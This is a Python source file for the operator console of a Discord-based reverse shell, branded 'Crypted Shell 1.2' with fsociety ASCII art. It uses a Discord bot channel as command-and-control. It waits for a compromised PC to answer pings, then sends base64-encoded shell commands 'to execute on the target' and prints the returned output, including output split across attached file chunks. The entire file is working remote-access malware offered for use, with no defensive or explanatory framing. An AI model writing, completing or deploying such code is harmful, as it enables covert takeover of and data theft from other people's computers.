import discord
import asyncio
from discord.ext import commands
import base64
import io
import os
import sys
import time
from colorama import Fore

SERVER_ID = 
CHANNEL_ID = 
TOKEN = ""

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


output_received = asyncio.Event()
pc_connected = asyncio.Event()

pending_chunks = {} 
ascii = """⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀\n"""

msg = "["+Fore.RED+"x"+Fore.RESET+"] Connection not found."

async def send_command(channel, msg: str):
    encoded = base64.b64encode(msg.encode()).decode()
    if len(encoded) < 1900:
        await channel.send(f"CMD::{encoded}")
    else:
        file_bytes = io.BytesIO(encoded.encode())
        await channel.send("CMDFILE::", file=discord.File(file_bytes, filename="command.b64"))

async def wait_for_pc(channel):
    while not pc_connected.is_set():
        await channel.send("PING::")
        try:
            await asyncio.wait_for(pc_connected.wait(), timeout=2)
        except asyncio.TimeoutError:
            continue

def restart_script():
    os.execv(sys.executable, [sys.executable] + sys.argv)

@bot.event
async def on_ready():
    global msg
    os.system("clear")
    print(ascii)
    print(msg)
    print("[-] Searching for a connection..")

    channel = bot.get_channel(CHANNEL_ID)

    await wait_for_pc(channel)
    os.system("clear")
    print(ascii)
    time.sleep(0.5)
    print(f"["+Fore.GREEN+"+"+Fore.RESET+"] Connection found")
    time.sleep(0.5)
    print("["+Fore.GREEN+"+"+Fore.RESET+"] Connecting ")
    time.sleep(0.5)
    print("["+Fore.GREEN+"+"+Fore.RESET+"] crypted shell is loaded.")
    time.sleep(0.5)
    os.system("clear")
    print(ascii)
    print("\nhttps://github.com/cryptedsociety/Reverse-Shell\n--------------------Crypted---------------------\nCrypted Shell 1.2\nFor further help check the github!\nType anything youd like to execute on the target\n")
    print(Fore.RED+"fsociety"+Fore.RESET+"@root ->", end="", flush=True)
    while True:
        msg = await asyncio.get_event_loop().run_in_executor(None, input, "")
        if msg.strip() == "refresh":
            restart_script()
        if msg.strip() == "exit":
           os._exit(0)

        if msg.strip():
            output_received.clear()
            await send_command(channel, msg)
            try:
                await asyncio.wait_for(output_received.wait(), timeout=25)
            except asyncio.TimeoutError:
                print("(no response — pc may be stuck, try again or type refresh)")
                print(Fore.RED+"fsociety"+Fore.RESET+"@root ->", end="", flush=True)

@bot.event
async def on_message(message):
    if message.channel.id != CHANNEL_ID:
        return

    if message.content == "PONG::":
        pc_connected.set()
        return

    if message.content.startswith("OUT::"):
        encoded = message.content[len("OUT::"):]
        output = base64.b64decode(encoded).decode(errors="replace")
        print(output)
        print(Fore.RED+"fsociety"+Fore.RESET+"@root ->", end="", flush=True)
        output_received.set()

    elif message.content.startswith("OUTFILE::") and message.attachments:
        header = message.content[len("OUTFILE::"):]
        idx_str, total_str = header.split("/")
        idx, total = int(idx_str), int(total_str)

        data = await message.attachments[0].read()

        if total not in pending_chunks:
            pending_chunks[total] = {}
        pending_chunks[total][idx] = data

        if len(pending_chunks[total]) == total:
            full_encoded = b"".join(pending_chunks[total][i] for i in range(1, total + 1))
            del pending_chunks[total]
            output = base64.b64decode(full_encoded).decode(errors="replace")
            print(output)
            print(Fore.RED+"fsociety"+Fore.RESET+"@root ->", end="", flush=True)
            output_received.set()

try:
    bot.run(TOKEN, log_handler=None)
except Exception:
    pass
